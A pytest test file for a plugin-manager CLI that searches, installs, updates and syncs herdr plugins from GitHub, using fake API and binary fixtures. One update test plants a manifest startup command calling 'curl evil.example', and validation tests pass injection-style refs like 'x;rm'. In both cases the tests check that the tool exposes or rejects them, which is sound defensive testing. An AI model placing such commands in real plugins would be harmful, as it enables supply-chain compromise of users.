"""agentos-herdr-plugins against a fake GitHub API and a fake herdr binary."""

import json
import subprocess

import pytest
from herdrfix import FakeGitHub, FakeHerdr, manifest

from agentos_services import herdr_plugins as hp

SHA_A = "a" * 40
SHA_B = "b" * 40


@pytest.fixture
def gh():
    g = FakeGitHub()
    yield g
    g.close()


@pytest.fixture
def herdr(tmp_path):
    return FakeHerdr(tmp_path)


@pytest.fixture
def env(tmp_path, monkeypatch, gh, herdr):
    monkeypatch.setenv("AGENTOS_HERDR_BIN", herdr.path)
    monkeypatch.setenv("FAKE_HERDR_STATE", herdr.state)
    monkeypatch.setenv("AGENTOS_HERDR_CACHE", str(tmp_path / "cache"))
    monkeypatch.setenv("AGENTOS_HERDR_STATE", str(tmp_path / "state"))
    monkeypatch.setenv("AGENTOS_HERDR_GITHUB_API", gh.url)
    monkeypatch.setenv("AGENTOS_HERDR_GITHUB_RAW", gh.url)
    monkeypatch.setenv("AGENTOS_HERDR_GIT_BASE", "file:///nonexistent")  # head commits come from the API fallback
    monkeypatch.delenv("GITHUB_TOKEN", raising=False)
    monkeypatch.delenv("FAKE_HERDR_FAIL", raising=False)
    monkeypatch.delenv("FAKE_HERDR_VERSION", raising=False)
    monkeypatch.delenv("FAKE_HERDR_IDS", raising=False)
    return tmp_path


def run(capsys, *argv):
    rc = hp.main(list(argv))
    out = capsys.readouterr()
    return rc, out.out, out.err


def state(env):
    return json.loads((env / "state" / "plugins.json").read_text())


# ── source and ref validation ──────────────────────────────────────────

def test_parse_source():
    assert hp.parse_source("a/b") == ("a", "b", "")
    assert hp.parse_source("a/b/c/d") == ("a", "b", "c/d")
    for bad in ["a", "a/b/..", "a/b/../c", "https://github.com/a/b", "a b/c", "", "a/b/./c"]:
        with pytest.raises(hp.PluginError):
            hp.parse_source(bad)
    for bad in ["", "-x", "a..b", "a b", "x;rm"]:
        with pytest.raises(hp.PluginError):
            hp.check_ref(bad)


# ── catalog ────────────────────────────────────────────────────────────

def test_catalog_lists_and_caches(env, gh, capsys):
    gh.add("alice/one", stars=50, sha=SHA_A, description="First plugin", license="Apache-2.0")
    gh.add("bob/two", stars=5, sha=SHA_B, license=None)
    rc, out, _ = run(capsys, "catalog")
    assert rc == 0
    lines = out.splitlines()
    assert lines[0].split()[:4] == ["REPOSITORY", "STARS", "LICENSE", "HEAD"]
    assert lines[1].startswith("alice/one") and "50" in lines[1] and "Apache-2.0" in lines[1] and SHA_A[:12] in lines[1]
    assert "bob/two" in lines[2] and "none" in lines[2]
    searches = [r for r in gh.requests if r[0] == "/search/repositories"]
    assert len(searches) == 1
    # cached: no new search
    run(capsys, "catalog")
    assert len([r for r in gh.requests if r[0] == "/search/repositories"]) == 1
    run(capsys, "catalog", "--refresh")
    assert len([r for r in gh.requests if r[0] == "/search/repositories"]) == 2
    rc, out, _ = run(capsys, "catalog", "--json", "--min-stars", "10")
    assert [r["full_name"] for r in json.loads(out)] == ["alice/one"]


def test_catalog_paginates(env, gh, capsys):
    for i in range(130):
        gh.add(f"o{i:03d}/r", stars=1000 - i, sha=SHA_A)
    rc, out, _ = run(capsys, "catalog", "--json")
    assert rc == 0 and len(json.loads(out)) == 130
    pages = [r for r in gh.requests if r[0] == "/search/repositories"]
    assert len(pages) == 2


def test_catalog_sends_token_only_to_the_api(env, gh, monkeypatch, capsys):
    gh.add("alice/one", sha=SHA_A)
    monkeypatch.setenv("GITHUB_TOKEN", "tok123")
    run(capsys, "catalog")
    assert ("/search/repositories", "Bearer tok123") in gh.requests


def test_rate_limit_is_explained(env, gh, capsys):
    gh.rate_limited = True
    rc, _, err = run(capsys, "catalog")
    assert rc == 1 and "rate limit" in err and "GITHUB_TOKEN" in err


# ── show ───────────────────────────────────────────────────────────────

def test_show_prints_every_command(env, gh, capsys):
    body = '''
[[build]]
command = ["npm", "ci"]
[[startup]]
command = ["node", "restore.js"]
[[actions]]
id = "apply"
title = "Apply"
command = ["node", "apply.js"]
[[events]]
on = "worktree.created"
command = ["herdr", "workspace", "list"]
[[panes]]
id = "board"
title = "Board"
command = ["herdr-board"]
'''
    gh.add("alice/multi", sha=SHA_A, files={"herdr-plugin.toml": manifest("alice.root", body=body),
                                            "tools/b/herdr-plugin.toml": manifest("alice.b")})
    rc, out, _ = run(capsys, "show", "alice/multi")
    assert rc == 0
    for needle in ["alice/multi  (alice.root", "alice/multi/tools/b", "build", "npm ci", "startup", "node restore.js",
                   "action  apply: node apply.js", "event   worktree.created: herdr workspace list",
                   "pane    board: herdr-board", SHA_A[:12]]:
        assert needle in out, needle
    rc, out, _ = run(capsys, "show", "alice/multi/tools/b")
    assert "alice.b" in out and "alice.root" not in out


def test_show_flags_incompatible(env, gh, capsys):
    gh.add("alice/win", sha=SHA_A, files={"herdr-plugin.toml": manifest("alice.win", platforms='["windows"]')})
    gh.add("alice/new", sha=SHA_A, files={"herdr-plugin.toml": manifest("alice.new", min="9.0.0")})
    _, out, _ = run(capsys, "show", "alice/win")
    assert "NOT INSTALLABLE HERE: platforms" in out
    _, out, _ = run(capsys, "show", "alice/new")
    assert "needs herdr >= 9.0.0" in out


# ── install ────────────────────────────────────────────────────────────

def test_install_pins_to_head_and_records(env, gh, herdr, capsys):
    gh.add("alice/one", sha=SHA_A)
    rc, out, _ = run(capsys, "install", "alice/one", "--yes")
    assert rc == 0 and "installed at " + SHA_A[:12] in out
    assert herdr.calls("plugin", "install") == [["plugin", "install", "alice/one", "--ref", SHA_A, "--yes"]]
    rec = state(env)["plugins"]["alice/one"]
    assert rec["ref"] == SHA_A and rec["managed_by"] == "cli" and rec["plugin_id"] == "alice.one"
    # a second install at the same commit does not touch herdr again
    rc, out, _ = run(capsys, "install", "alice/one", "--yes")
    assert rc == 0 and "already installed" in out
    assert len(herdr.calls("plugin", "install")) == 1


def test_install_explicit_ref_and_subdir(env, gh, herdr, capsys):
    gh.add("alice/multi", sha=SHA_A, files={"herdr-plugin.toml": manifest("alice.root"),
                                            "sub/x/herdr-plugin.toml": manifest("alice.x")})
    rc, out, _ = run(capsys, "install", "alice/multi/sub/x", "--ref", "v1.2.3", "--yes")
    assert rc == 0
    assert herdr.calls("plugin", "install") == [["plugin", "install", "alice/multi/sub/x", "--ref", "v1.2.3", "--yes"]]
    assert state(env)["plugins"]["alice/multi/sub/x"]["ref"] == "v1.2.3"


def test_install_repo_with_only_subdir_plugins_installs_each(env, gh, herdr, capsys):
    gh.add("alice/pack", sha=SHA_A, files={"a/herdr-plugin.toml": manifest("alice.a"),
                                           "b/herdr-plugin.toml": manifest("alice.b")})
    rc, _, _ = run(capsys, "install", "alice/pack", "--yes")
    assert rc == 0
    assert sorted(c[2] for c in herdr.calls("plugin", "install")) == ["alice/pack/a", "alice/pack/b"]


def test_install_needs_confirmation_when_not_interactive(env, gh, herdr, capsys, monkeypatch):
    gh.add("alice/one", sha=SHA_A)
    monkeypatch.setattr("sys.stdin.isatty", lambda: False, raising=False)
    rc, out, err = run(capsys, "install", "alice/one")
    assert rc == 2 and "pass --yes" in err
    assert "npm" not in out
    assert herdr.calls("plugin", "install") == []


def test_install_confirmation_answers(env, gh, herdr, capsys, monkeypatch):
    gh.add("alice/one", sha=SHA_A)
    monkeypatch.setattr("sys.stdin.isatty", lambda: True, raising=False)
    monkeypatch.setattr("builtins.input", lambda *_: "n")
    rc, _, err = run(capsys, "install", "alice/one")
    assert rc == 2 and herdr.calls("plugin", "install") == []
    monkeypatch.setattr("builtins.input", lambda *_: "y")
    rc, _, _ = run(capsys, "install", "alice/one")
    assert rc == 0 and len(herdr.calls("plugin", "install")) == 1


def test_install_refuses_incompatible(env, gh, herdr, capsys):
    gh.add("alice/win", sha=SHA_A, files={"herdr-plugin.toml": manifest("alice.win", platforms='["windows"]')})
    rc, _, err = run(capsys, "install", "alice/win", "--yes")
    assert rc == 1 and "nothing to install" in err
    assert herdr.calls("plugin", "install") == []


def test_install_rejects_bad_input(env, gh, capsys):
    rc, _, err = run(capsys, "install", "not-a-source", "--yes")
    assert rc == 1 and "not a plugin source" in err
    rc, _, err = run(capsys, "install", "a/b", "--ref", "x;y", "--yes")
    assert rc == 1 and "invalid ref" in err
    gh.add("alice/none", sha=SHA_A, files={"README.md": "hi"})
    rc, _, err = run(capsys, "install", "alice/none", "--yes")
    assert rc == 1 and "no herdr-plugin.toml" in err


# ── install-all ────────────────────────────────────────────────────────

def marketplace(gh):
    gh.add("a/good", stars=100, sha=SHA_A)
    gh.add("b/popular", stars=500, sha=SHA_B)
    gh.add("c/winonly", stars=50, sha=SHA_A, files={"herdr-plugin.toml": manifest("c.win", platforms='["windows"]')})
    gh.add("d/future", stars=40, sha=SHA_A, files={"herdr-plugin.toml": manifest("d.future", min="9.9.0")})
    gh.add("e/dup", stars=5, sha=SHA_A, files={"herdr-plugin.toml": manifest("a.good")})
    gh.add("f/small", stars=1, sha=SHA_B)
    gh.add("g/multi", stars=30, sha=SHA_A, files={"x/herdr-plugin.toml": manifest("g.x"), "y/herdr-plugin.toml": manifest("g.y")})


def test_install_all_filters_pins_and_lists_commands(env, gh, herdr, capsys):
    marketplace(gh)
    rc, out, _ = run(capsys, "install-all", "--yes")
    assert rc == 0
    installed = sorted(c[2] for c in herdr.calls("plugin", "install"))
    assert installed == ["a/good", "b/popular", "f/small", "g/multi/x", "g/multi/y"]
    assert all(c[3:] == ["--ref", SHA_A if c[2] != "b/popular" and c[2] != "f/small" else SHA_B, "--yes"]
               for c in herdr.calls("plugin", "install"))
    assert "skipped c/winonly: platforms" in out
    assert "skipped d/future: needs herdr >= 9.9.0" in out
    assert "skipped e/dup: plugin id a.good already provided by a/good" in out
    assert "5 plugin(s) would be installed" in out and "do not sandbox" in out.replace("does not", "do not")
    assert set(state(env)["plugins"]) == set(installed)


def test_install_all_exclude_min_stars_dry_run(env, gh, herdr, capsys):
    marketplace(gh)
    rc, out, _ = run(capsys, "install-all", "--dry-run", "--min-stars", "20", "--exclude", "b/*", "--exclude", "g/multi/y")
    assert rc == 0 and herdr.calls("plugin", "install") == []
    assert "a/good" in out and "g/multi/x" in out
    assert "b/popular" not in out.split("skipped")[0] and "g/multi/y" not in out.split("skipped")[0]
    assert "f/small" not in out


def test_install_all_needs_yes_when_not_interactive(env, gh, herdr, capsys, monkeypatch):
    marketplace(gh)
    monkeypatch.setattr("sys.stdin.isatty", lambda: False, raising=False)
    rc, _, err = run(capsys, "install-all")
    assert rc == 2 and "--yes" in err and herdr.calls("plugin", "install") == []


def test_install_all_continues_after_a_failure(env, gh, herdr, monkeypatch, capsys):
    marketplace(gh)
    monkeypatch.setenv("FAKE_HERDR_FAIL", "a/good")
    rc, out, _ = run(capsys, "install-all", "--yes")
    assert rc == 1 and "a/good: FAILED" in out and "4 ok, 1 failed" in out
    assert "a/good" not in state(env)["plugins"] and "b/popular" in state(env)["plugins"]


def test_install_all_is_idempotent(env, gh, herdr, capsys):
    marketplace(gh)
    run(capsys, "install-all", "--yes")
    n = len(herdr.calls("plugin", "install"))
    rc, out, _ = run(capsys, "install-all", "--yes")
    assert rc == 0 and len(herdr.calls("plugin", "install")) == n and "already installed" in out


def test_install_all_respects_installed_herdr_version(env, gh, herdr, monkeypatch, capsys):
    gh.add("a/needs", stars=1, sha=SHA_A, files={"herdr-plugin.toml": manifest("a.needs", min="0.9.2")})
    monkeypatch.setenv("FAKE_HERDR_VERSION", "0.9.1")
    rc, out, _ = run(capsys, "install-all", "--yes")
    assert "needs herdr >= 0.9.2" in out and herdr.calls("plugin", "install") == []
    monkeypatch.setenv("FAKE_HERDR_VERSION", "0.9.3")
    run(capsys, "install-all", "--yes")
    assert len(herdr.calls("plugin", "install")) == 1


# ── update / list / remove ─────────────────────────────────────────────

def test_update_shows_manifest_diff_and_repins(env, gh, herdr, capsys):
    gh.add("alice/one", sha=SHA_A, files={"herdr-plugin.toml": manifest("alice.one", version="1.0.0")})
    run(capsys, "install", "alice/one", "--yes")
    rc, out, _ = run(capsys, "update", "--yes")
    assert rc == 0 and "up to date" in out
    gh.repos["alice/one"].update(sha=SHA_B, files={"herdr-plugin.toml": manifest(
        "alice.one", version="1.1.0", body='[[startup]]\ncommand = ["curl", "evil.example"]\n')})
    rc, out, _ = run(capsys, "update", "alice/one", "--yes")
    assert rc == 0
    assert f"{SHA_A[:12]} -> {SHA_B[:12]}" in out
    assert '-version = "1.0.0"' in out and '+version = "1.1.0"' in out and "+command = [\"curl\", \"evil.example\"]" in out
    assert "startup" in out and "curl evil.example" in out
    assert herdr.calls("plugin", "install")[-1] == ["plugin", "install", "alice/one", "--ref", SHA_B, "--yes"]
    assert state(env)["plugins"]["alice/one"]["ref"] == SHA_B


def test_update_declined_keeps_the_old_commit(env, gh, herdr, monkeypatch, capsys):
    gh.add("alice/one", sha=SHA_A)
    run(capsys, "install", "alice/one", "--yes")
    gh.repos["alice/one"]["sha"] = SHA_B
    monkeypatch.setattr("sys.stdin.isatty", lambda: True, raising=False)
    monkeypatch.setattr("builtins.input", lambda *_: "n")
    rc, out, _ = run(capsys, "update")
    assert "left at " + SHA_A[:12] in out and state(env)["plugins"]["alice/one"]["ref"] == SHA_A


def test_update_only_touches_cli_installs(env, gh, capsys):
    rc, _, err = run(capsys, "update")
    assert rc == 1 and "no matching plugin" in err


def test_list_and_remove(env, gh, herdr, capsys):
    gh.add("alice/one", sha=SHA_A)
    run(capsys, "install", "alice/one", "--yes")
    herdr.update(plugins=herdr.data()["plugins"] + [
        {"plugin_id": "mine.manual", "version": "0.3.0", "enabled": False, "source": {"kind": "github", "owner": "me", "repo": "mine", "resolved_commit": "d" * 40}},
        {"plugin_id": "dev.local", "version": "0.0.1", "enabled": True, "plugin_root": "/src/dev", "source": {"kind": "local"}}])
    rc, out, _ = run(capsys, "list", "--json")
    rows = {r["id"]: r for r in json.loads(out)}
    assert rows["alice.one"]["managed_by"] == "cli" and rows["alice.one"]["ref"] == SHA_A[:12]
    assert rows["mine.manual"]["managed_by"] == "manual" and rows["mine.manual"]["enabled"] is False
    assert rows["dev.local"]["managed_by"] == "manual-link"
    rc, out, _ = run(capsys, "remove", "alice.one")
    assert rc == 0 and "removed alice/one" in out
    assert "alice/one" not in state(env)["plugins"]
    assert [p["plugin_id"] for p in herdr.data()["plugins"]] == ["mine.manual", "dev.local"]
    rc, _, err = run(capsys, "remove", "nobody/nothing")
    assert rc == 1 and "not a GitHub-installed plugin" in err


# ── sync (declarative) ─────────────────────────────────────────────────

def write_cfg(env, plugins=(), links=(), managed=False):
    cfg = env / "cfg.json"
    cfg.write_text(json.dumps({"plugins": list(plugins), "links": list(links), "server_managed": managed}))
    return str(cfg)


def test_sync_installs_pinned_and_is_idempotent(env, herdr, capsys):
    cfg = write_cfg(env, [{"source": "alice/one", "ref": SHA_A, "enable": True},
                          {"source": "bob/two/sub", "ref": "v2.0.0", "enable": True}])
    rc, out, _ = run(capsys, "sync", "--config", cfg)
    assert rc == 0
    assert sorted(c[2:] for c in herdr.calls("plugin", "install")) == [
        ["alice/one", "--ref", SHA_A, "--yes"], ["bob/two/sub", "--ref", "v2.0.0", "--yes"]]
    st = state(env)["plugins"]
    assert st["alice/one"]["managed_by"] == "declarative" and st["bob/two/sub"]["ref"] == "v2.0.0"
    # nothing is reinstalled when the matching ref is already there (even a tag)
    rc, out, _ = run(capsys, "sync", "--config", cfg)
    assert rc == 0 and len(herdr.calls("plugin", "install")) == 2 and out.count("already installed") == 2
    # a new ref reinstalls
    cfg = write_cfg(env, [{"source": "alice/one", "ref": SHA_B, "enable": True},
                          {"source": "bob/two/sub", "ref": "v2.0.0", "enable": True}])
    run(capsys, "sync", "--config", cfg)
    assert herdr.calls("plugin", "install")[-1][2:] == ["alice/one", "--ref", SHA_B, "--yes"]
    assert len(herdr.calls("plugin", "install")) == 3


def test_sync_enable_flag_uses_a_temporary_server(env, herdr, capsys):
    cfg = write_cfg(env, [{"source": "alice/one", "ref": SHA_A, "enable": False}])
    rc, out, _ = run(capsys, "sync", "--config", cfg)
    assert rc == 0 and "alice.one: disabled" in out
    assert herdr.calls("plugin", "disable") == [["plugin", "disable", "alice.one"]]
    assert [c for c in herdr.calls("server") if c == ["server"]] == [["server"]]
    assert herdr.calls("server", "stop") == [["server", "stop"]]
    assert herdr.data()["server"] is False  # the temporary server is gone again
    assert herdr.data()["plugins"][0]["enabled"] is False
    # enabling again
    cfg = write_cfg(env, [{"source": "alice/one", "ref": SHA_A, "enable": True}])
    run(capsys, "sync", "--config", cfg)
    assert herdr.data()["plugins"][0]["enabled"] is True


def test_sync_leaves_a_running_server_alone(env, herdr, capsys):
    herdr.update(server=True)
    cfg = write_cfg(env, [{"source": "alice/one", "ref": SHA_A, "enable": False}])
    rc, _, _ = run(capsys, "sync", "--config", cfg)
    assert rc == 0 and herdr.calls("server") == []
    assert herdr.data()["server"] is True


def test_sync_uninstalls_only_what_it_installed(env, gh, herdr, capsys):
    gh.add("cli/tool", sha=SHA_A)
    run(capsys, "install", "cli/tool", "--yes")  # installed by the CLI, never declared
    herdr.update(plugins=herdr.data()["plugins"] + [
        {"plugin_id": "hand.made", "version": "1", "enabled": True,
         "source": {"kind": "github", "owner": "hand", "repo": "made", "resolved_commit": "e" * 40}}])
    cfg = write_cfg(env, [{"source": "alice/one", "ref": SHA_A, "enable": True},
                          {"source": "bob/two", "ref": SHA_A, "enable": True}])
    run(capsys, "sync", "--config", cfg)
    cfg = write_cfg(env, [{"source": "alice/one", "ref": SHA_A, "enable": True}])
    rc, out, _ = run(capsys, "sync", "--config", cfg)
    assert rc == 0 and "bob/two: uninstalled (no longer declared)" in out
    ids = sorted(p["plugin_id"] for p in herdr.data()["plugins"])
    assert ids == ["alice.one", "cli.tool", "hand.made"]
    assert "bob/two" not in state(env)["plugins"]
    # an empty configuration removes all declared ones and still spares the others
    run(capsys, "sync", "--config", write_cfg(env))
    assert sorted(p["plugin_id"] for p in herdr.data()["plugins"]) == ["cli.tool", "hand.made"]


def test_sync_reinstalls_a_declared_plugin_removed_by_hand(env, herdr, capsys):
    cfg = write_cfg(env, [{"source": "alice/one", "ref": SHA_A, "enable": True}])
    run(capsys, "sync", "--config", cfg)
    herdr.update(plugins=[])
    run(capsys, "sync", "--config", cfg)
    assert len(herdr.calls("plugin", "install")) == 2


def test_sync_links_and_unlinks(env, herdr, tmp_path, capsys):
    plug = tmp_path / "myplugin"
    plug.mkdir()
    (plug / "herdr-plugin.toml").write_text(manifest("local.demo"))
    cfg = write_cfg(env, links=[str(plug)])
    rc, out, _ = run(capsys, "sync", "--config", cfg)
    assert rc == 0 and "local.demo" in out
    assert [p["plugin_id"] for p in herdr.data()["plugins"]] == ["local.demo"]
    # linking is repeated harmlessly
    rc, _, _ = run(capsys, "sync", "--config", cfg)
    assert rc == 0 and [p["plugin_id"] for p in herdr.data()["plugins"]] == ["local.demo"]
    # dropped from the configuration: unlinked (needs a server, which is started temporarily)
    rc, out, _ = run(capsys, "sync", "--config", write_cfg(env))
    assert rc == 0 and "local.demo: unlinked" in out and herdr.data()["plugins"] == []
    assert herdr.data()["server"] is False


def test_sync_reports_failures_but_continues(env, herdr, monkeypatch, capsys):
    monkeypatch.setenv("FAKE_HERDR_FAIL", "alice/one")
    cfg = write_cfg(env, [{"source": "alice/one", "ref": SHA_A}, {"source": "bob/two", "ref": SHA_A}])
    rc, _, err = run(capsys, "sync", "--config", cfg)
    assert rc == 1 and "alice/one" in err
    assert [p["plugin_id"] for p in herdr.data()["plugins"]] == ["bob.two"]


def test_sync_rejects_bad_config(env, capsys):
    rc, _, err = run(capsys, "sync", "--config", write_cfg(env, [{"source": "a/b", "ref": "x y"}]))
    assert rc == 1 and "invalid ref" in err
    rc, _, err = run(capsys, "sync", "--config", str(env / "missing.json"))
    assert rc == 1 and "cannot read" in err


# ── git head resolution ────────────────────────────────────────────────

def test_head_sha_uses_git_ls_remote(tmp_path):
    repo = tmp_path / "o" / "r.git"
    repo.mkdir(parents=True)
    work = tmp_path / "work"
    git = ["git", "-c", "user.name=t", "-c", "user.email=t@t", "-c", "init.defaultBranch=main"]
    subprocess.run([*git, "init", "-q", str(work)], check=True)
    (work / "f").write_text("x")
    subprocess.run([*git, "-C", str(work), "add", "f"], check=True)
    subprocess.run([*git, "-C", str(work), "commit", "-qm", "c"], check=True)
    subprocess.run([*git, "clone", "-q", "--bare", str(work), str(repo)], check=True)
    want = subprocess.run([*git, "-C", str(work), "rev-parse", "HEAD"], capture_output=True, text=True, check=True).stdout.strip()
    g = hp.GitHub(api="http://127.0.0.1:1", git_base=f"file://{tmp_path}")
    assert g.head_sha("o/r", "main") == want
